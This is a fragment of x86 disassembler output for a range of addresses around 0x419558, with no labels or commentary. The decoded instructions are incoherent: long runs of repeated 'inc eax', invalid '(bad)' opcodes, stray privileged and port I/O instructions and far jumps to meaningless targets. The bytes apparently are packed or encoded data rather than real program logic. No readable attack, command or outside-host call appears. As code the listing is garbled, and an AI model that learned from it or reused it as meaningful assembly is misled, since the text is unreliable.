  419558:	inc    eax
  419559:	inc    eax
  41955a:	inc    eax
  41955b:	inc    eax
  41955c:	inc    eax
  41955d:	inc    eax
  41955e:	inc    eax
  41955f:	add    BYTE PTR [eax-0x4c6b7ac],cl
  419565:	test   al,0x3c
  419567:	bound  ebp,QWORD PTR [eax+0x3d813f40]
  41956d:	inc    eax
  41956e:	test   al,0x6f
  419570:	les    ebp,FWORD PTR [esi]
  419572:	ins    DWORD PTR es:[edi],dx
  419573:	ss inc eax
  419575:	inc    eax
  419576:	inc    eax
  419577:	inc    eax
  419578:	inc    eax
  419579:	inc    eax
  41957a:	and    eax,0x63404040
  41957f:	sub    dh,BYTE PTR [eax]
  419581:	arpl   WORD PTR [eax-0x6f17c0c0],ax
  419587:	adc    DWORD PTR [eax],eax
  419589:	and    BYTE PTR [esi],bl
  41958b:	daa    
  41958c:	daa    
  41958d:	pop    edx
  41958e:	adc    eax,0x4994bf
  419593:	inc    eax
  419594:	pop    ss
  419595:	cmp    al,0xe5
  419597:	mov    edi,0x2928d939
  41959c:	inc    eax
  41959d:	inc    eax
  41959e:	inc    eax
  41959f:	inc    eax
  4195a0:	inc    eax
  4195a1:	inc    eax
  4195a2:	inc    eax
  4195a3:	inc    eax
  4195a4:	inc    eax
  4195a5:	inc    eax
  4195a6:	push   eax
  4195a7:	xchg   esp,eax
  4195a8:	push   edx
  4195a9:	mov    edi,0x40553eb5
  4195ae:	jae    0x4195f0
  4195b0:	fs dec eax
  4195b2:	test   al,0x49
  4195b4:	inc    ebp
  4195b5:	xor    eax,DWORD PTR [edi]
  4195b7:	dec    eax
  4195b8:	std    
  4195b9:	int    0x10
  4195bb:	stc    
  4195bc:	mov    dl,0xc0
  4195be:	mov    al,0x40
  4195c0:	enter  0xb4cb,0xa0
  4195c4:	shl    BYTE PTR [eax+eax*2+0x40],1
  4195c8:	inc    eax
  4195c9:	inc    eax
  4195ca:	inc    eax
  4195cb:	inc    eax
  4195cc:	rol    DWORD PTR [eax+0x40],0x3
  4195d0:	inc    eax
  4195d1:	imul   edx,DWORD PTR [eax+0x40402842],0xbf0540be
  4195db:	jne    0x41963e
  4195dd:	inc    eax
  4195de:	and    DWORD PTR [ebp+0x40],ebp
  4195e1:	dec    ebp
  4195e2:	inc    eax
  4195e3:	cld    
  4195e4:	arpl   WORD PTR [edx-0x2c],ax
  4195e7:	mov    ecx,0x214ce540
  4195ec:	repz xor DWORD PTR [edx+0x6d],eax
  4195f0:	inc    eax
  4195f1:	clc    
  4195f2:	inc    eax
  4195f3:	inc    eax
  4195f4:	add    BYTE PTR [eax+0x40],al
  4195f7:	inc    eax
  4195f8:	inc    eax
  4195f9:	inc    eax
  4195fa:	inc    eax
  4195fb:	inc    esp
  4195fc:	pop    edi
  4195fd:	loopne 0x4195a8
  4195ff:	and    edi,DWORD PTR [edi+0x3d288aeb]
  419605:	mov    al,0x48
  419607:	inc    eax
  419608:	sbb    ebp,ebp
  41960a:	inc    ebx
  41960b:	cmc    
  41960c:	jbe    0x4195da
  41960e:	inc    ebx
  41960f:	inc    eax
  419610:	inc    eax
  419611:	inc    eax
  419612:	inc    eax
  419613:	inc    eax
  419614:	inc    eax
  419615:	inc    eax
  419616:	inc    eax
  419617:	inc    eax
  419618:	inc    eax
  419619:	pusha  
  41961a:	mov    edi,0x23a8aad2
  41961f:	stc    
  419620:	inc    esp
  419621:	adc    al,0x9
  419623:	mov    ds:0x67dc1288,eax
  419628:	and    al,0x40
  41962a:	mov    ebp,0x1a8c43d1
  41962f:	push   eax
  419630:	ss sub bh,cl
  419633:	into   
  419634:	test   eax,0xb0b86c15
  419639:	loop   0x4196a8
  41963b:	cdq    
  41963c:	xchg   BYTE PTR [eax+0x40],al
  41963f:	inc    eax
  419640:	inc    eax
  419641:	inc    eax
  419642:	inc    eax
  419643:	int3   
  419644:	jne    0x419686
  419646:	retf   
  419647:	fs push 0xffffffa8
  41964a:	inc    eax
  41964b:	dec    ebp
  41964c:	fdivr  st,st(3)
  41964e:	inc    ebx
  41964f:	scas   al,BYTE PTR es:[edi]
  419650:	js     0x419663
  419652:	add    esp,DWORD PTR [ebp+0x446251a9]
  419658:	push   esi
  419659:	dec    eax
  41965a:	pop    eax
  41965b:	jno    0x41969d
  41965d:	add    cl,al
  41965f:	inc    eax
  419660:	inc    eax
  419661:	inc    eax
  419662:	inc    eax
  419663:	add    BYTE PTR [eax-0x46],al
  419666:	data16 shl BYTE PTR [edi+0x3d],0xd
  41966b:	inc    esi
  41966c:	fs pop ds
  41966e:	test   BYTE PTR [edx+0x42],ah
  419671:	push   0x40404acb
  419676:	inc    eax
  419677:	inc    eax
  419678:	inc    eax
  419679:	inc    eax
  41967a:	inc    eax
  41967b:	inc    eax
  41967c:	inc    DWORD PTR [eax+0x21]
  41967f:	lods   al,BYTE PTR ds:[esi]
  419680:	adc    eax,0x105f8e46
  419685:	inc    eax
  419686:	mov    esi,0x3d34e6b9
  41968b:	sub    BYTE PTR [ebp+ecx*2-0x5b4dc5bc],bh
  419692:	pusha  
  419693:	mov    edi,0x65e14005
  419698:	fs mov ah,0x15
  41969b:	mov    ch,cl
  41969d:	inc    eax
  41969e:	inc    eax
  41969f:	inc    eax
  4196a0:	inc    eax
  4196a1:	inc    eax
  4196a2:	inc    eax
  4196a3:	inc    eax
  4196a4:	inc    eax
  4196a5:	inc    eax
  4196a6:	inc    eax
  4196a7:	imul   ecx,DWORD PTR [eax-0x6c],0xc377a8fa
  4196ae:	push   eax
  4196af:	pusha  
  4196b0:	popa   
  4196b1:	cwde   
  4196b2:	adc    BYTE PTR [ecx],0x1a
  4196b5:	inc    ebx
  4196b6:	xor    eax,0x4e605b40
  4196bb:	mov    eax,0x2d40ab62
  4196c0:	imul   esp,ebp,0x404042aa
  4196c6:	inc    eax
  4196c7:	inc    eax
  4196c8:	inc    eax
  4196c9:	inc    eax
  4196ca:	inc    eax
  4196cb:	inc    eax
  4196cc:	add    BYTE PTR [eax-0x50],ah
  4196cf:	mov    esp,0x8034d040
  4196d4:	(bad)  
  4196d6:	add    eax,0x8f2d253d
  4196db:	push   ebp
  4196dc:	pushf  
  4196dd:	sub    ebx,ecx
  4196df:	ret    
  4196e0:	inc    eax
  4196e1:	ins    DWORD PTR es:[edi],dx
  4196e2:	hlt    
  4196e3:	mov    ebp,0xbc454863
  4196e8:	xor    al,0x63
  4196ea:	scas   al,BYTE PTR es:[edi]
  4196eb:	inc    eax
  4196ec:	push   0x704f4643
  4196f1:	dec    ecx
  4196f2:	push   edi
  4196f3:	inc    eax
  4196f4:	int3   
  4196f5:	xor    DWORD PTR [eax+0x40],eax
  4196f8:	inc    eax
  4196f9:	inc    eax
  4196fa:	inc    eax
  4196fb:	inc    eax
  4196fc:	and    eax,0x41404040
  419701:	stos   DWORD PTR es:[edi],eax
  419702:	inc    eax
  419703:	bound  esp,QWORD PTR [edx-0x73feffc0]
  419709:	sar    BYTE PTR [ecx],1
  41970b:	cs sub eax,0x68a86849
  419711:	mov    edi,0x41205242
  419716:	sub    eax,0x40bf4310
  41971b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41971c:	sbb    dh,ah
  41971e:	jno    0x41977c
  419720:	inc    eax
  419721:	inc    eax
  419722:	inc    eax
  419723:	inc    eax
  419724:	inc    eax
  419725:	inc    eax
  419726:	inc    eax
  419727:	inc    eax
  419728:	inc    eax
  419729:	inc    eax
  41972a:	and    al,0xb7
  41972c:	xor    edi,DWORD PTR [ebp+0x598c4f0]
  419732:	lea    edi,[ecx+0x62ab4840]
  419738:	test   al,0xcb
  41973a:	test   al,0xa8
  41973c:	das    
  41973d:	popa   
  41973e:	cdq    
  41973f:	lds    ebp,FWORD PTR [ebp+ecx*2+0x40]
  419743:	inc    eax
  419744:	inc    eax
  419745:	inc    eax
  419746:	inc    eax
  419747:	inc    eax
  419748:	rol    DWORD PTR [eax+0x40],0x11
  41974c:	adc    BYTE PTR [eax+0x45],al
  41974f:	add    BYTE PTR [edi+0x440cab77],0x34
  419756:	mov    ds:0x4562fc98,eax
  41975b:	out    dx,eax
  41975c:	inc    esp
  41975d:	inc    eax
  41975e:	push   esi
  41975f:	xchg   ebx,eax
  419760:	sbb    BYTE PTR [eax+0x308c6277],bh
  419766:	arpl   di,bx
  419768:	xlat   BYTE PTR ds:[ebx]
  419769:	or     eax,0x40284c5c
  41976e:	enter  0x4040,0x0
  419772:	inc    eax
  419773:	inc    eax
  419774:	inc    eax
  419775:	inc    eax
  419776:	inc    eax
  419777:	inc    eax
  419778:	dec    ecx
  419779:	cli    
  41977a:	retf   
  41977b:	arpl   WORD PTR ds:0x4021f512,ax
  419781:	or     eax,0x22cd5cc8
  419786:	repnz push esi
  419788:	jo     0x41976f
  41978a:	out    dx,eax
  41978b:	or     eax,0x21408612
  419790:	inc    eax
  419791:	inc    eax
  419792:	inc    eax
  419793:	inc    eax
  419794:	inc    eax
  419795:	inc    eax
  419796:	inc    eax
  419797:	inc    eax
  419798:	inc    eax
  419799:	inc    eax
  41979a:	pop    ebx
  41979b:	push   ss
  41979c:	and    cl,bl
  41979e:	test   al,0xce
  4197a0:	inc    eax
  4197a1:	jno    0x419753
  4197a3:	sub    BYTE PTR fs:[edx],dl
  4197a6:	adc    eax,0x6a213973
  4197ab:	stc    
  4197ac:	dec    ebx
  4197ad:	(bad)  
  4197ae:	int    0xac
  4197b0:	dec    esp
  4197b1:	gs mov al,0xf8
  4197b4:	sub    bl,BYTE PTR [eax+ebx*2-0x3b]
  4197b8:	push   ecx
  4197b9:	and    eax,DWORD PTR [eax]
  4197bb:	add    eax,0x4040409c
  4197c0:	inc    eax
  4197c1:	inc    eax
  4197c2:	inc    eax
  4197c3:	int3   
  4197c4:	jne    0x419806
  4197c6:	cmp    eax,0xf1769e2a
  4197cb:	ficom  DWORD PTR [edx-0x2b]
  4197ce:	ret    
  4197cf:	inc    ebp
  4197d0:	lock xor cl,ah
  4197d3:	inc    ebx
  4197d4:	sti    
  4197d5:	retf   
  4197d6:	inc    eax
  4197d7:	add    cl,al
  4197d9:	inc    eax
  4197da:	inc    eax
  4197db:	inc    eax
  4197dc:	inc    eax
  4197dd:	add    BYTE PTR [eax-0x70],al
  4197e0:	sub    al,BYTE PTR [edi-0x7f5a40e1]
  4197e6:	jne    0x4197a7
  4197e8:	dec    eax
  4197e9:	mov    edi,0x84296246
  4197ee:	inc    ecx
  4197ef:	inc    eax
  4197f0:	jecxz  0x4197b1
  4197f2:	mov    ah,0xe5
  4197f4:	mov    ch,0x69
  4197f6:	add    eax,0x6fbf9043
  4197fb:	cld    
  4197fc:	fisttp WORD PTR ds:0x40404424
  419802:	inc    eax
  419803:	inc    eax
  419804:	inc    eax
  419805:	inc    eax
  419806:	inc    eax
  419807:	inc    eax
  419808:	inc    DWORD PTR [eax-0x3]
  41980b:	sbb    al,BYTE PTR [ecx-0x5d]
  41980e:	rcr    DWORD PTR [edx+0x68],1
  419811:	xor    BYTE PTR [edi-0x27320abe],ah
  419817:	cmc    
  419818:	xor    al,0x1e
  41981a:	test   al,0x51
  41981c:	iret   
  41981d:	arpl   WORD PTR [esi],bp
  41981f:	stc    
  419820:	fisubr WORD PTR [eax+0x40404010]
  419826:	inc    eax
  419827:	inc    eax
  419828:	inc    eax
  419829:	inc    eax
  41982a:	inc    eax
  41982b:	inc    eax
  41982c:	inc    eax
  41982d:	mov    al,0x18
  41982f:	gs popa 
  419831:	repnz retf 0xa812
  419835:	sbb    BYTE PTR [ebx],ch
  419837:	gs push ds
  419839:	inc    ebx
  41983a:	sub    DWORD PTR [eax+0x42],ebx
  41983d:	lds    esp,FWORD PTR [ecx]
  41983f:	inc    ecx
  419840:	popf   
  419841:	jmp    0x224b:0x41261526
  419848:	mov    ebx,0xcccb6222
  41984d:	out    dx,al
  41984e:	inc    eax
  41984f:	inc    eax
  419850:	inc    eax
  419851:	inc    eax
  419852:	inc    eax
  419853:	inc    eax
  419854:	inc    eax
  419855:	inc    eax
  419856:	add    BYTE PTR [ecx],dh
  419858:	sub    eax,0x4dcdf812
  41985d:	bound  eax,QWORD PTR [ebx+ecx*2-0x37]
  419861:	xchg   edx,eax
  419862:	lock adc BYTE PTR [ebx-0x5e6ed3a8],ch
  419869:	pop    edx
  41986a:	adc    eax,0x162a4852
  41986f:	inc    eax
  419870:	xor    al,0x61
  419872:	inc    ecx
  419873:	push   edx
  419874:	leave  
  419875:	js     0x41984c
  419877:	jo     0x41985a
  419879:	inc    ebx
  41987a:	mov    DWORD PTR [esp+ebp*4],eax
  41987d:	push   ebp
  41987e:	inc    eax
  41987f:	inc    eax
  419880:	inc    eax
  419881:	inc    eax
  419882:	inc    eax
  419883:	inc    eax
  419884:	and    eax,0x50404040
  419889:	sub    edi,DWORD PTR [ebx+0x48cd2858]
  41988f:	ret    
  419890:	loop   0x4198b0
  419892:	pop    ebp
  419893:	push   ds
  419894:	gs mov esp,0xd24458d0
  41989a:	mov    ds:0x5015ee7a,eax
  41989f:	jae    0x4198cd
  4198a1:	outs   dx,BYTE PTR ds:[esi]
  4198a2:	inc    ecx
  4198a3:	dec    eax
  4198a4:	or     eax,0x404063cb
  4198a9:	inc    eax
  4198aa:	inc    eax
  4198ab:	inc    eax
  4198ac:	inc    eax
  4198ad:	inc    eax
  4198ae:	inc    eax
  4198af:	inc    eax
  4198b0:	inc    eax
  4198b1:	fst    QWORD PTR [edx+eiz*2]
  4198b4:	arpl   di,di
  4198b6:	mov    ecx,DWORD PTR ds:0xd151834a
  4198bc:	je     0x419850
  4198be:	push   ss
  4198bf:	xor    eax,0x35911d3a
  4198c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4198c5:	add    BYTE PTR [eax+0x40],0x40
  4198c9:	inc    eax
  4198ca:	inc    eax
  4198cb:	inc    eax
  4198cc:	rol    DWORD PTR [eax+0x40],0x64
  4198d0:	inc    eax
  4198d1:	ins    DWORD PTR es:[edi],dx
  4198d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4198d3:	inc    esp
  4198d4:	iret   
  4198d5:	inc    ebx
  4198d6:	loopne 0x4198d1
  4198d8:	dec    ecx
  4198d9:	arpl   cx,cx
  4198db:	sub    al,0xdb
  4198dd:	call   0xf8285c9
  4198e2:	inc    eax
  4198e3:	inc    eax
  4198e4:	add    BYTE PTR [eax+0x40],al
  4198e7:	inc    eax
  4198e8:	inc    eax
  4198e9:	inc    eax
  4198ea:	inc    eax
  4198eb:	daa    
  4198ec:	adc    dh,BYTE PTR [edx+esi*1]
  4198ef:	sub    al,BYTE PTR ds:0x51cc3434
  4198f5:	shl    DWORD PTR [esi],cl
  4198f7:	mov    ebx,DWORD PTR [edx+0x4b]
  4198fa:	inc    eax
  4198fb:	inc    eax
  4198fc:	inc    eax
  4198fd:	inc    eax
  4198fe:	inc    eax
  4198ff:	inc    eax
  419900:	inc    eax
  419901:	inc    eax
  419902:	inc    eax
  419903:	inc    eax
  419904:	adc    BYTE PTR [ecx+edx*4],0xea
  419908:	loope  0x41991c
  41990a:	ret    
  41990b:	fadd   st(5),st
  41990d:	fs inc esp
  41990f:	jno    0x419959
  419911:	loopne 0x419985
  419913:	dec    esp
  419914:	xchg   edx,eax
  419915:	stos   BYTE PTR es:[edi],al
  419916:	sub    al,0x42
  419918:	popa   
  419919:	inc    eax
  41991a:	inc    eax
  41991b:	inc    eax
  41991c:	inc    eax
  41991d:	inc    eax
  41991e:	inc    eax
  41991f:	int3   
  419920:	jne    0x419962
  419922:	imul   edi,eax,0x105542c5
  419928:	repz das 
  41992a:	push   edx
  41992b:	jmp    0x2342:0xd53d77c9
  419932:	out    0x4a,al
  419934:	xchg   ecx,eax
  419935:	jl     0x419904
  419937:	pusha  
  419938:	shl    DWORD PTR [edi+0x62bfbf06],cl
  41993e:	inc    eax
  41993f:	add    cl,al
  419941:	inc    eax
  419942:	inc    eax
  419943:	inc    eax
  419944:	inc    eax
  419945:	add    BYTE PTR [eax+0x44],al
  419948:	dec    BYTE PTR [esi+0x49]
  41994b:	imul   eax
  41994d:	inc    edx
  41994e:	fsub   QWORD PTR [edi+0x44]
  419951:	jne    0x419974
  419953:	ret    0x694a
  419956:	rcr    BYTE PTR [ecx-0x58b8b1d4],1
  41995c:	mov    ebp,0xe30482c
  419961:	jg     0x4199c4
  419963:	test   esi,esp
  419965:	enter  0x472a,0xcd
  419969:	dec    esi
  41996a:	push   esi
  41996b:	out    dx,eax
  41996c:	inc    eax
  41996d:	inc    eax
  41996e:	inc    eax
  41996f:	inc    eax
  419970:	inc    eax
  419971:	inc    eax
  419972:	inc    eax
  419973:	inc    eax
  419974:	inc    DWORD PTR [eax+0x4a]
  419977:	inc    ebx
  419978:	ret    
  419979:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41997a:	pusha  
  41997b:	jg     0x419920
  41997d:	mov    ds:0x53a83dbd,eax
  419982:	repnz inc eax
  419984:	inc    eax
  419985:	inc    eax
  419986:	inc    eax
  419987:	inc    eax
  419988:	inc    eax
  419989:	inc    eax
  41998a:	inc    eax
  41998b:	inc    eax
  41998c:	inc    eax
  41998d:	mov    edi,0x62e43d39
  419992:	inc    eax
  419993:	rol    DWORD PTR [esi+ecx*2-0x1f],0xcf
  419998:	inc    edx
  419999:	test   al,0x2a
  41999b:	test   al,0x2c
  41999d:	jg     0x4199c3
  41999f:	inc    edx
  4199a0:	jne    0x4199b2
  4199a2:	inc    ecx
  4199a3:	adc    cl,BYTE PTR [esi+ecx*2]
  4199a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4199a7:	addr16 inc eax
  4199a9:	inc    eax
  4199aa:	inc    eax
  4199ab:	inc    eax
  4199ac:	inc    eax
  4199ad:	inc    eax
  4199ae:	inc    eax
  4199af:	inc    eax
  4199b0:	add    BYTE PTR [ecx-0x74],ch
  4199b3:	retf   
  4199b4:	inc    esp
  4199b5:	lds    edi,FWORD PTR [edi+0xd]
  4199b8:	sbb    ecx,DWORD PTR [ebp+eax*1+0x28]
  4199bc:	sub    BYTE PTR [esi+0x4c],0xa2
  4199c0:	fdiv   st,st(1)
  4199c2:	retf   
  4199c3:	jnp    0x419988
  4199c5:	loop   0x4199b8
  4199c7:	sub    bl,BYTE PTR [esi]
  4199c9:	sub    DWORD PTR [ebx+0x40],eax
  4199cc:	inc    eax
  4199cd:	inc    eax
  4199ce:	inc    eax
  4199cf:	inc    eax
  4199d0:	inc    eax
  4199d1:	and    eax,0xe8404040
  4199d6:	inc    ebx
  4199d7:	inc    esp
  4199d8:	dec    esi
  4199d9:	adc    DWORD PTR [edx+0x62],0x2c03624d
  4199e0:	pop    ds
  4199e1:	loope  0x419a21
  4199e3:	inc    eax
  4199e4:	inc    eax
  4199e5:	inc    eax
  4199e6:	inc    eax
  4199e7:	inc    eax
  4199e8:	inc    eax
  4199e9:	inc    eax
  4199ea:	inc    eax
  4199eb:	inc    eax
  4199ec:	inc    eax
  4199ed:	lds    ecx,FWORD PTR [edi+edi*2-0x42b4f560]
  4199f4:	bound  eax,QWORD PTR [edi+0x5162e811]
  4199fa:	cmc    
  4199fb:	push   esp
  4199fc:	push   0xffffffe0
  4199fe:	inc    edx
  4199ff:	adc    dl,BYTE PTR [ecx+edx*4]
  419a02:	and    al,0xe1
  419a04:	je     0x419a57
  419a06:	xor    DWORD PTR [eax+0x74],edx
  419a09:	inc    esp
  419a0a:	icebp  
  419a0b:	or     al,0xe7
  419a0d:	retf   
  419a0e:	int    0x15
  419a10:	bound  ebp,QWORD PTR [eax+eax*2]
  419a13:	inc    eax
  419a14:	inc    eax
  419a15:	inc    eax
  419a16:	inc    eax
  419a17:	inc    eax
  419a18:	rol    DWORD PTR [eax+0x40],0xa3
  419a1c:	loope  0x419a4d
  419a1e:	fmulp  st(5),st
  419a20:	retf   
  419a21:	push   eax
  419a22:	or     BYTE PTR [edi+0x28],dl
  419a25:	fisttp DWORD PTR [edx]
  419a27:	pop    eax
  419a28:	inc    eax
  419a29:	add    eax,0x24209fcd
  419a2e:	test   eax,0x42cb422a
  419a33:	inc    eax
  419a34:	inc    eax
  419a35:	add    BYTE PTR [eax+0x40],al
  419a38:	inc    eax
  419a39:	inc    eax
  419a3a:	inc    eax
  419a3b:	inc    eax
  419a3c:	jae    0x419a70
  419a3e:	cdq    
  419a3f:	fadd   QWORD PTR [ecx+0x1a]
  419a42:	(bad)  
  419a43:	fidivr WORD PTR [edi+0x2af67624]
  419a49:	sub    BYTE PTR ds:0x43211939,dh
  419a4f:	icebp  
  419a50:	nop
  419a51:	call   0x34b6e2d6
  419a56:	mov    BYTE PTR [esi-0x41],ah
  419a59:	or     eax,0x40404040
  419a5e:	inc    eax
  419a5f:	inc    eax
  419a60:	inc    eax
  419a61:	inc    eax
  419a62:	inc    eax
  419a63:	inc    eax
  419a64:	lds    esi,FWORD PTR [ecx]
  419a66:	imul   esp,DWORD PTR [ecx-0x5],0xffffffda
  419a6a:	ins    BYTE PTR es:[edi],dx
  419a6b:	int    0x92
  419a6d:	push   es
  419a6e:	push   edx
  419a6f:	sub    BYTE PTR [ecx],bh
  419a71:	or     eax,0xc5bf4400
  419a76:	xor    eax,DWORD PTR [eax+0x40]
  419a79:	inc    eax
  419a7a:	inc    eax
  419a7b:	inc    eax
  419a7c:	inc    eax
  419a7d:	int3   
  419a7e:	jne    0x419ac0
  419a80:	and    DWORD PTR [ecx+0x46fb47e4],ecx
  419a86:	push   es
  419a87:	mov    ds:0x42be1a44,eax
  419a8c:	cwde   
  419a8d:	mov    al,0xfa
  419a8f:	mov    ch,0x20
  419a91:	frstor [ebp+0x30]
  419a94:	adc    eax,0xaf2144b8
  419a99:	jne    0x419a73
  419a9b:	add    cl,cl
  419a9d:	bound  esp,QWORD PTR [eax]
  419a9f:	push   ebx
  419aa0:	ins    BYTE PTR es:[edi],dx
  419aa1:	mov    ecx,0xc1004003
  419aa6:	inc    eax
  419aa7:	inc    eax
  419aa8:	inc    eax
  419aa9:	inc    eax
  419aaa:	add    BYTE PTR [eax-0x58],al
  419aad:	rol    BYTE PTR es:[eax+edi*1],1
  419ab1:	inc    eax
  419ab2:	arpl   WORD PTR [ebp-0x2abcbeee],di
  419ab8:	xor    al,0x25
  419aba:	xchg   edx,eax
  419abb:	(bad)  
  419abc:	mov    edi,0x175c2d1c
  419ac1:	dec    esp
  419ac2:	(bad)  
  419ac3:	adc    eax,0x4040c8bf
  419ac8:	inc    eax
  419ac9:	inc    eax
  419aca:	inc    eax
  419acb:	inc    eax
  419acc:	inc    eax
  419acd:	inc    eax
  419ace:	inc    DWORD PTR [eax+0x1]
  419ad1:	into   
  419ad2:	inc    edx
  419ad3:	jecxz  0x419a83
  419ad5:	fistp  QWORD PTR [esi-0x2ddcd477]
  419adb:	jns    0x419b43
  419add:	push   ds
  419ade:	xchg   esp,eax
  419adf:	sub    al,0x9d
  419ae1:	inc    esp
  419ae2:	popf   
  419ae3:	and    DWORD PTR [esp+eiz*2+0x44],ebp
  419ae7:	xchg   esp,eax
  419ae8:	arpl   WORD PTR [ecx],sp
  419aea:	xor    BYTE PTR ds:0x549fad1,al
  419af0:	inc    eax
  419af1:	inc    eax
  419af2:	inc    eax
  419af3:	inc    eax
  419af4:	inc    eax
  419af5:	inc    eax
  419af6:	inc    eax
  419af7:	inc    eax
  419af8:	inc    eax
  419af9:	inc    eax
  419afa:	adc    BYTE PTR [edx],dh
  419afc:	push   ebx
  419afd:	loop   0x419ad3
  419aff:	aam    0x3c
  419b01:	xchg   DWORD PTR [ebp+ebp*1-0x70],edi
  419b05:	and    DWORD PTR [edi],esi
  419b07:	or     eax,0x3962d358
  419b0c:	xor    ah,BYTE PTR [ecx+ebp*1]
  419b0f:	loop   0x419b3b
  419b11:	stos   DWORD PTR es:[edi],eax
  419b12:	push   edi
  419b13:	pop    esp
  419b14:	pop    edx
  419b15:	mov    ds:0x5291a327,al
  419b1a:	and    al,0x2c
  419b1c:	nop
  419b1d:	pop    ebp
  419b1e:	aaa    
  419b1f:	gs inc eax
  419b21:	inc    eax
  419b22:	inc    eax
  419b23:	inc    eax
  419b24:	inc    eax
  419b25:	inc    eax
  419b26:	inc    eax
  419b27:	inc    eax
  419b28:	add    BYTE PTR [edi+0x603055e8],bh
  419b2e:	ss ins DWORD PTR es:[edi],dx
  419b30:	shr    BYTE PTR [edi+eax*1+0x34],cl
  419b34:	lds    ebx,FWORD PTR [ecx]
  419b36:	adc    ebp,DWORD PTR [ebx+0x51]
  419b39:	or     cl,ch
  419b3b:	dec    ecx
  419b3c:	inc    ecx
  419b3d:	jb     0x419ae0
  419b3f:	push   edi
  419b40:	test   eax,0x40404243
  419b45:	inc    eax
  419b46:	inc    eax
  419b47:	inc    eax
  419b48:	inc    eax
  419b49:	and    eax,0x2a404040
  419b4e:	out    dx,al
  419b4f:	sub    eax,0x45d06a43
  419b54:	and    al,0x90
  419b56:	inc    esp
  419b57:	dec    eax
  419b58:	loopne 0x419aeb
  419b5a:	mov    ds:0x2cbf8628,eax
  419b5f:	push   ebx
  419b60:	inc    eax
  419b61:	inc    eax
  419b62:	inc    eax
  419b63:	inc    eax
  419b64:	inc    eax
  419b65:	inc    eax
  419b66:	inc    eax
  419b67:	inc    eax
  419b68:	inc    eax
  419b69:	inc    eax
  419b6a:	sub    esi,esi
  419b6c:	fst    QWORD PTR [edi]
  419b6e:	pop    es
  419b6f:	ins    BYTE PTR es:[edi],dx
  419b70:	cs adc eax,0x4166393d
  419b76:	leave  
  419b77:	inc    edx
  419b78:	aad    0x3e
  419b7a:	and    eax,0x40cdce81
  419b7f:	je     0x419bc8
  419b81:	inc    eax
  419b82:	inc    eax
  419b83:	inc    eax
  419b84:	inc    eax
  419b85:	inc    eax
  419b86:	inc    eax
  419b87:	rol    DWORD PTR [eax+0x40],0xd3
  419b8b:	jl     0x419bc3
  419b8d:	or     eax,0xeea42a6a
  419b92:	xor    al,0x61
  419b94:	call   0x6291dc8a
  419b99:	inc    esp
  419b9a:	rcr    DWORD PTR [ebp+0x5a],cl
  419b9d:	adc    al,BYTE PTR [eax+0x2a]
  419ba0:	(bad)  
  419ba1:	sub    al,0x9a
  419ba3:	inc    eax
  419ba4:	inc    eax
  419ba5:	add    BYTE PTR [eax+0x40],al
  419ba8:	inc    eax
  419ba9:	inc    eax
  419baa:	inc    eax
  419bab:	inc    eax
  419bac:	mov    al,ds:0x9240653c
  419bb1:	sbb    eax,0x942d332c
  419bb6:	int3   
  419bb7:	idiv   BYTE PTR [edi+0x2e4bcda8]
  419bbd:	inc    eax
  419bbe:	inc    ebx
  419bbf:	lds    ebp,FWORD PTR [edi+ecx*1+0x5c]
  419bc3:	jno    0x419c14
  419bc5:	inc    eax
  419bc6:	test   eax,0xee57444f
  419bcb:	dec    ebp
  419bcc:	loope  0x419c0e
  419bce:	retf   0xc040
  419bd1:	bound  eax,QWORD PTR [eax+eax*2+0x40]
  419bd5:	inc    eax
  419bd6:	inc    eax
  419bd7:	inc    eax
  419bd8:	inc    eax
  419bd9:	inc    eax
  419bda:	inc    eax
  419bdb:	inc    eax
  419bdc:	inc    eax
  419bdd:	jno    0x419c1c
  419bdf:	inc    eax
  419be0:	add    BYTE PTR [esp+edi*1-0x18],al
  419be4:	sub    al,0x60
  419be6:	in     eax,0x40
  419be8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419be9:	inc    eax
  419bea:	cmp    dl,al
  419bec:	sub    bl,BYTE PTR [ecx+0x3d]
  419bef:	inc    edx
  419bf0:	enter  0x9834,0x62
  419bf4:	lds    eax,FWORD PTR [edi+edi*8-0x50]
  419bf8:	or     eax,0x5c23a8fd
  419bfd:	test   DWORD PTR [ecx+0x40],0x40407edf
  419c04:	inc    eax
  419c05:	inc    eax
  419c06:	inc    eax
  419c07:	inc    eax
  419c08:	int3   
  419c09:	jne    0x419c4b
  419c0b:	adc    DWORD PTR [esi+ebp*8],esi
  419c0e:	mov    ecx,0x4d1248e3
  419c13:	call   0x259de0a1
  419c18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c19:	bound  eax,QWORD PTR gs:[edx+0x40]
  419c1d:	add    cl,al
  419c1f:	inc    eax
  419c20:	inc    eax
  419c21:	inc    eax
  419c22:	inc    eax
  419c23:	add    BYTE PTR [eax-0x3b],al
  419c26:	sub    al,0x91
  419c28:	loope  0x419c29
  419c2a:	(bad)  
  419c2b:	push   eax
  419c2c:	sub    al,0x40
  419c2e:	sub    BYTE PTR [eax],dh
  419c30:	push   eax
  419c31:	mov    edi,0x4074c5ee
  419c36:	aad    0xb4
  419c38:	popa   
  419c39:	xchg   ecx,ebp
  419c3b:	leave  
  419c3c:	bound  eax,QWORD PTR [eax+0x18]
  419c3f:	js     0x419c66
  419c41:	inc    eax
  419c42:	inc    ax
  419c44:	inc    eax
  419c45:	inc    eax
  419c46:	inc    eax
  419c47:	inc    eax
  419c48:	inc    eax
  419c49:	inc    eax
  419c4a:	inc    eax
  419c4b:	inc    DWORD PTR [eax+0x2f]
  419c4e:	add    al,0x49
  419c50:	loop   0x419c72
  419c52:	mov    ds:0x2a0fc441,eax
  419c57:	stc    
  419c58:	inc    esp
  419c59:	nop
  419c5a:	ins    DWORD PTR es:[edi],dx
  419c5b:	adc    DWORD PTR ds:0x40404040,0x40
  419c62:	inc    eax
  419c63:	inc    eax
  419c64:	inc    eax
  419c65:	inc    eax
  419c66:	inc    eax
  419c67:	bound  ebp,QWORD PTR [ecx]
  419c69:	mov    esp,0x4023702c
  419c6e:	jg     0x419cb0
  419c70:	inc    edx
  419c71:	add    eax,0xbfbf3626
  419c76:	inc    eax
  419c77:	inc    eax
  419c78:	inc    eax
  419c79:	inc    eax
  419c7a:	inc    eax
  419c7b:	inc    eax
